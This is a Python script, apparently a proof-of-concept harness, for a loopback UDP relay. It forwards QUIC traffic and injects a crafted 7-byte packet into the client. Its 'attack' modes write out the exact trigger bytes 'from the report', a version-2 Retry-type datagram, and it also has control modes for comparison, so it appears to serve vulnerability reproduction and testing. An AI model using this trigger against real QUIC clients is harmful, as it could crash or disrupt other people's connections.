#!/usr/bin/env python3
"""Loopback UDP relay that injects one selected 7-byte QUIC datagram."""

import argparse
import pathlib
import socket
import sys
import time

V1 = bytes.fromhex("00000001")
V2 = bytes.fromhex("6b3343cf")

MODES = {
    "attack-original": (0x80, V2),      # Exact 7-byte trigger from the report.
    "attack-fixedbit": (0xC0, V2),      # Same v2 Retry type, Fixed Bit set.
    "control-original": (0x80, V1),     # Original v1 control from the report.
    "control-retry": (0xF0, V1),        # v1 Retry; same early Retry dispatch path.
}


def make_packet(mode: str) -> bytes:
    first, version = MODES[mode]
    return bytes([first]) + version + b"\x00\x00"


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--listen", type=int, default=4567)
    parser.add_argument("--upstream", type=int, default=4568)
    parser.add_argument("--mode", choices=MODES, required=True)
    parser.add_argument("--marker", required=True)
    parser.add_argument("--injection-marker", required=True)
    parser.add_argument("--delay-ms", type=int, default=10)
    args = parser.parse_args()

    marker = pathlib.Path(args.marker)
    injection_marker = pathlib.Path(args.injection_marker)
    packet = make_packet(args.mode)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("127.0.0.1", args.listen))
    sock.settimeout(0.5)

    client = None
    server_datagrams = 0
    injected = False
    upstream = ("127.0.0.1", args.upstream)

    print(
        f"RELAY_READY listen={args.listen} upstream={args.upstream} "
        f"mode={args.mode} packet={packet.hex()}",
        flush=True,
    )

    try:
        while True:
            try:
                data, address = sock.recvfrom(65535)
            except socket.timeout:
                continue

            if address[1] == args.upstream:
                server_datagrams += 1
                if client is not None:
                    sock.sendto(data, client)

                if not injected and client is not None and marker.exists():
                    print(
                        f"INJECTION_PENDING server_datagrams={server_datagrams} "
                        f"client={client}",
                        flush=True,
                    )
                    time.sleep(max(args.delay_ms, 0) / 1000.0)
                    sock.sendto(packet, client)
                    injection_marker.write_text(packet.hex(), encoding="ascii")
                    injected = True
                    print(
                        f"INJECTED mode={args.mode} packet={packet.hex()} "
                        f"client={client}",
                        flush=True,
                    )
            else:
                client = address
                sock.sendto(data, upstream)
                print(f"C2S bytes={len(data)} client={client}", flush=True)
    except KeyboardInterrupt:
        return 0
    finally:
        sock.close()


if __name__ == "__main__":
    sys.exit(main())
